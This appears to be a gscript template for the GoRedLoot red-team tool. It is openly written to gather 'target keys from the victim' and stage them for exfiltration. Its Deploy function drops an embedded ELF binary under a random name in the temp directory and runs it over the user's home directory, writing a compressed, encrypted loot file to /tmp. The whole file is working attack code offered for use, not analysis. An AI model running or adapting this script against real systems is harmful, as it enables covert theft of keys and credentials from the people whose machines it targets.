// Example gscript template
// Title: GoRedLoot
// Author: ahhh
// Purpose: Gathers target keys from the victim and stages (compresses / encrypts) them for exfil
// Gscript version: 1.0.0
// ATT&CK: 
// Tactic: Late pirority to run toward the end, will compress and encrypt to a random outfile
// Uses: GoRedLoot to take search and stage: https://github.com/ahhh/GoRedLoot

//priority:200
//timeout:200

//go_import:os/user as user2
//go_import:os as os2

//import:/private/tmp/GoRedLoot.elf

function Deploy() {  
    console.log("Starting GoRedLoot");
    // Getting our asset
    var lootBin = GetAssetAsBytes("GoRedLoot.elf");
    console.log("errors: "+Dump(lootBin[1]));

    // Get user home directory
    var user = user2.Current();
    console.log(user[0]);
    var searchDir = user[0].HomeDir+"/";

    // Getting a random name and dropping file
    var temppath = os2.TempDir();
    var naming = G.rand.GetAlphaNumericString(6);
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    G.file.WriteFileFromBytes(name, lootBin[0]);
    console.log("dropped the GoRedLoot binary here: "+name);

    // Create random out file
    var outfile = G.rand.GetAlphaNumericString(5);
    outfile = "/tmp/"+outfile.toLowerCase();
      
    // Executing child proc
    var proc = G.exec.ExecuteCommandAsync(name, [searchDir, outfile]);
    console.log("err: "+Dump(proc[1]));
    console.log("pid: "+proc[0].Process.Pid);
    
    console.log("Done GoRedLoot");
    return true;
}